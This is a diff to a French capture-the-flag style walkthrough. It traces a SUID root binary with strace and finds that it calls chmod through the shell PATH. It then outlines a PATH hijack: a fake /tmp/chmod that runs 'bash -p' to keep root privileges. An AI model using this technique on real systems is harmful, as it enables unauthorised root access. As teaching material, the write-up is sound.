@@ -928,56 +928,50 @@ Il s’agit donc d’un binaire ELF 64 bits, dynamique, avec le bit SUID. À ce 
 
 ### Analyse avec strace
 
-Pour observer le comportement du binaire, tu peux l’exécuter avec `strace` et enregistrer la sortie complète dans un fichier temporaire :
+Tu passes donc à une analyse dynamique avec `strace`. Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
 
 ```bash
-strace -o /tmp/docker-security.strace /usr/local/bin/docker-security
+strace -f -o /tmp/docker-security.strace /usr/local/bin/docker-security
 ```
 
-L’intérêt de cette méthode est de conserver une trace complète des appels système, puis de l’analyser après coup avec `grep`.
+L’option `-f` est importante, car le programme lance des processus enfants. Sans elle, tu ne verrais pas les commandes exécutées par ces sous-processus. L’option `-o` permet d’écrire la trace dans un fichier, ce qui rend l’analyse plus simple.
 
-Tu recherches d’abord les appels à `execve`, qui indiquent les programmes exécutés par le binaire :
+Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
 
 ```bash
-grep execve /tmp/docker-security.strace
+grep -n "execve" /tmp/docker-security.strace
 ```
 
-Résultat :
+La sortie montre que `docker-security` lance `/bin/sh` pour exécuter deux commandes `chmod` :
 
 ```bash
-execve("/usr/local/bin/docker-security", ["/usr/local/bin/docker-security"], 0x7ffd...) = 0
-execve("chmod", ["chmod", "700", "/usr/bin/docker"], 0x7ffd...) = 0
+execve("/bin/sh", ["sh", "-c", "chmod 700 /usr/bin/docker"], ...)
+execve("/bin/sh", ["sh", "-c", "chmod 660 /var/run/docker.sock"], ...)
 ```
 
-Tu filtres ensuite plus précisément autour de `chmod` :
+Maintenant que tu sais que `chmod` est appelé, tu filtres la trace sur ce mot-clé :
 
 ```bash
-grep chmod /tmp/docker-security.strace
+grep -n "chmod" /tmp/docker-security.strace
 ```
 
-Résultat :
+Cette fois, la sortie montre que le shell recherche `chmod` dans les répertoires du `PATH` :
 
 ```bash
-execve("chmod", ["chmod", "700", "/usr/bin/docker"], 0x7ffd...) = 0
+stat("/usr/local/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
+stat("/usr/local/bin/chmod", ...) = -1 ENOENT (No such file or directory)
+stat("/usr/sbin/chmod", ...) = -1 ENOENT (No such file or directory)
+stat("/usr/bin/chmod", ...) = 0
 ```
 
-Le résultat est intéressant : le programme appelle `chmod` sans utiliser de chemin absolu.
-
-Dans un fonctionnement plus sûr, le binaire devrait appeler directement `/bin/chmod` ou `/usr/bin/chmod`. Ici, il appelle seulement `chmod`, ce qui signifie que le système va chercher un exécutable nommé `chmod` dans les répertoires listés dans la variable `PATH`.
-
-Tu peux vérifier le contenu actuel du `PATH` :
+Le programme finit donc par exécuter le vrai binaire `/usr/bin/chmod` :
 
 ```bash
-echo $PATH
+execve("/usr/bin/chmod", ["chmod", "700", "/usr/bin/docker"], ...)
+execve("/usr/bin/chmod", ["chmod", "660", "/var/run/docker.sock"], ...)
 ```
 
-Exemple :
-
-```bash
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-```
-
-Si tu places un faux exécutable nommé `chmod` dans un répertoire contrôlé, puis que tu ajoutes ce répertoire au début du `PATH`, le binaire SUID peut exécuter ton script à la place du vrai `chmod`.
+Cette résolution via le `PATH` est la faiblesse exploitable. Comme `docker-security` est un binaire SUID appartenant à `root`, tu peux tenter de placer un faux `chmod` dans un répertoire contrôlé, puis modifier le `PATH` pour que ce faux `chmod` soit exécuté à la place de `/usr/bin/chmod`.
 
 ### Détournement du PATH avec un faux chmod
 
@@ -995,7 +989,7 @@ Le script contient simplement un appel à Bash avec l’option `-p`.
 
 Cette option est importante : elle demande à Bash de conserver les privilèges effectifs hérités du programme SUID, au lieu de les abandonner.
 
-Tu rends ensuite le faux `chmod` exécutable :
+Tu rends ensuite le faux `chmod` exécutable en appelant explicitement le vrai binaire système :
 
 ```bash
 /usr/bin/chmod +x /tmp/chmod
